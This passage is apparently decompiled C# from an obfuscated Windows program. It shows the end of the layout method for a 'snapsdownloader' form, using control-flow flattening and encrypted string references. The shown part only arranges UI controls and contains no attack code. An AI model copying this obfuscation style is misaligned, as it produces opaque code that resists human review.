            num1 = (int) num2 * -787477790 ^ -801022699;
            continue;
          case 81:
            ((snapsdownloader) this).Label1.TabIndex = 0;
            ((snapsdownloader) this).Label1.Text = EXGuarder.\u0033B69071B;
            ((snapsdownloader) this).Bbar.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 345306477 ^ -139824956;
            continue;
          case 82:
            ((snapsdownloader) this).finishedtext.Size = new Size(764, 28);
            num1 = (int) num2 * -47902616 ^ 1354436946;
            continue;
          case 83:
            ((snapsdownloader) this).infotext.Cursor = Cursors.Hand;
            ((snapsdownloader) this).infotext.Dock = DockStyle.Fill;
            ((snapsdownloader) this).infotext.FlatStyle = FlatStyle.Flat;
            ((snapsdownloader) this).infotext.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Bold);
            num1 = (int) num2 * 1863054436 ^ 1019287557;
            continue;
          case 84:
            ((snapsdownloader) this).infotext.Name = EXGuarder.\u00348541E47;
            ((snapsdownloader) this).infotext.Size = new Size(681, 44);
            num1 = (int) num2 * 148457691 ^ -2020701056;
            continue;
          case 85:
            ((snapsdownloader) this).DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1365117636 ^ 1824334355;
            continue;
          case 86:
            this.Controls.Add((Control) ((snapsdownloader) this).lefttext);
            num1 = (int) num2 * -929683174 ^ -407421615;
            continue;
          case 87:
            ((snapsdownloader) this).Bbar.StyleCustomMode = true;
            num1 = (int) num2 * -292512082 ^ -535463810;
            continue;
          case 88:
            ((snapsdownloader) this).DrakeUIButtonIcon12.TabIndex = 50;
            ((snapsdownloader) this).clipic.Dock = DockStyle.Left;
            num1 = (int) num2 * 427758843 ^ -850602722;
            continue;
          case 89:
            ((snapsdownloader) this).Bbar.MinimumSize = new Size(70, 23);
            ((snapsdownloader) this).Bbar.Name = EXGuarder.\u00311652105;
            num1 = (int) num2 * 823453 ^ 980984571;
            continue;
          case 90:
            ((snapsdownloader) this).finishedtext.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            ((snapsdownloader) this).finishedtext.Location = new Point(0, 128);
            num1 = (int) num2 * 327474589 ^ -1619752666;
            continue;
          case 91:
            ((snapsdownloader) this).clipic.Location = new Point(0, 0);
            num1 = (int) num2 * -1501713852 ^ -486666356;
            continue;
          default:
            goto label_93;
        }
      }
label_93:
      this.ResumeLayout(false);
    }
  }
}
